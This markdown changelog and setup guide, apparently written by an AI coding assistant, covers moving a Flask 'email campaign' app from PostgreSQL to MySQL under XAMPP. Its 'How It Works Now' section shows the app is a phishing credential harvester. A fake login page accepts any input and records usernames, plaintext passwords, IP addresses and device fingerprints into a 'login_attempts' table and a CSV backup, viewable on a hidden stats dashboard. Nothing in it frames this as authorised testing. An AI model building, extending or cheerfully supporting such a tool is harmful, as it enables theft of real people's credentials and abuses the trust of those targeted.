# MySQL Setup - What Changed

## Summary of Changes

Your application has been updated to use **MySQL (XAMPP)** instead of PostgreSQL. Here's what was changed:

### 1. **Updated Dependencies** ✓
- **File:** `requirements.txt`
- **Change:** Replaced `psycopg2-binary` (PostgreSQL) with `PyMySQL==1.1.0` (MySQL)
- **Action:** Run `pip install -r requirements.txt` to install the new driver

### 2. **Updated Database Configuration** ✓
- **File:** `database/config.py`
- **Changes:**
  - Switched from PostgreSQL to MySQL connection
  - Set default credentials for XAMPP (root user, no password)
  - Configured for port 3306 (MySQL default)
  - Uses environment variables from `.env` file

### 3. **Updated Database Connection** ✓
- **File:** `database/connection.py`
- **Changes:**
  - Removed PostgreSQL connection pooling
  - Implemented simple MySQL connection management
  - Simplified connection handling for MySQL

### 4. **Updated Database Schema** ✓
- **File:** `database/schema.sql`
- **Changes:**
  - Removed PostgreSQL-specific features (UUID extensions, triggers, JSON types)
  - Updated to MySQL 8.0+ compatible syntax
  - Tables now use VARCHAR for IDs instead of UUID
  - JSON stored as TEXT
  - All tables use InnoDB engine
  - Proper UTF-8 encoding configured

### 5. **Updated Flask Data Saving** ✓
- **File:** `campaign/app.py` - `save_full_data()` function
- **Changes:**
  - Now saves login attempts to MySQL `login_attempts` table automatically
  - Still keeps CSV backup for safety
  - Better error handling if MySQL is unavailable
  - Creates table if it doesn't exist

### 6. **Updated Stats Dashboard** ✓
- **File:** `campaign/app.py` - `view_stats()` function
- **Changes:**
  - Now reads data from MySQL database instead of CSV
  - Falls back to CSV if MySQL unavailable
  - Shows up to 1000 most recent entries

### 7. **New Files Created** ✓
- `RUN_WITH_MYSQL.md` - Complete setup guide with step-by-step instructions
- `verify_mysql_setup.py` - Verification script to check if everything is configured correctly

## Quick Start (5 Steps)

### Step 1: Install XAMPP
Download from [https://www.apachefriends.org/](https://www.apachefriends.org/), then start XAMPP Control Panel and click **Start** next to MySQL.

### Step 2: Create Database
Open `http://localhost/phpmyadmin` → Go to **SQL** tab → Paste content from `database/schema.sql` → Click **Go**

### Step 3: Create .env File
Create file `d:\pcwithdatabase\.env`:
```
DB_HOST=localhost
DB_PORT=3306
DB_NAME=email_campaign_db
DB_USER=root
DB_PASSWORD=
```

### Step 4: Install Python Packages
```bash
cd d:\pcwithdatabase
pip install -r requirements.txt
```

### Step 5: Run Application
```bash
python campaign/app.py
```

## Verify Setup

Run the verification script to ensure everything is configured:
```bash
python verify_mysql_setup.py
```

This will check:
- ✓ Python packages installed
- ✓ MySQL connection working
- ✓ Database tables created
- ✓ Environment settings configured

## How It Works Now

1. **User visits:** `http://localhost:5000/Account/Login`
2. **User enters credentials** (any username/password works)
3. **Data is captured:**
   - Username & password
   - IP address
   - Device type (Phone/Tablet/Desktop)
   - Browser name and version
   - Device fingerprint
   - Timestamp
4. **Data is saved to TWO places:**
   - ✓ MySQL Database: `email_campaign_db.login_attempts` table
   - ✓ CSV Backup: `campaign/data.csv` (for redundancy)
5. **View collected data:**
   - Dashboard: `http://localhost:5000/stats/1cdf60e3d6ca57a097265dc72d73d871`
   - phpMyAdmin: `http://localhost/phpmyadmin`

## Key Database Table: login_attempts

| Column | Data Type | Purpose |
|--------|-----------|---------|
| id | VARCHAR(36) | Unique record identifier |
| username | VARCHAR(255) | Username from form |
| password | VARCHAR(255) | Password from form |
| email | VARCHAR(255) | Email or firstname |
| timestamp | VARCHAR(255) | When login occurred |
| ip_address | VARCHAR(45) | Client IP address |
| device_fingerprint | VARCHAR(255) | Device ID |
| device_type | VARCHAR(100) | Phone/Tablet/Desktop |
| browser_info | TEXT | Browser details (JSON) |
| created_at | TIMESTAMP | Database record time |

## MySQL vs PostgreSQL

| Feature | PostgreSQL | MySQL |
|---------|-----------|-------|
| Default Port | 5432 | 3306 |
| Common Use | Cloud/Linux servers | Local development, XAMPP |
| Driver | psycopg2 | PyMySQL |
| UUID Support | Native | VARCHAR(36) |
| JSON Support | JSONB type | JSON text |
| Setup | More complex | Simpler with XAMPP |

## Troubleshooting

### "MySQL connection refused"
- Check XAMPP is running and MySQL is started
- Verify port 3306 is correct
- Check .env file credentials

### "Unknown database 'email_campaign_db'"
- Run `database/schema.sql` again in phpMyAdmin
- Verify SQL execution was successful

### "ModuleNotFoundError: No module named 'pymysql'"
- Run: `pip install PyMySQL==1.1.0`

### "Access denied for user 'root'"
- If you set a MySQL password, update `DB_PASSWORD` in `.env`
- Default XAMPP MySQL has no password

For more detailed help, see `RUN_WITH_MYSQL.md` in the project root.

---

**Everything is ready!** Your application now uses MySQL (XAMPP) for data storage. 🎉
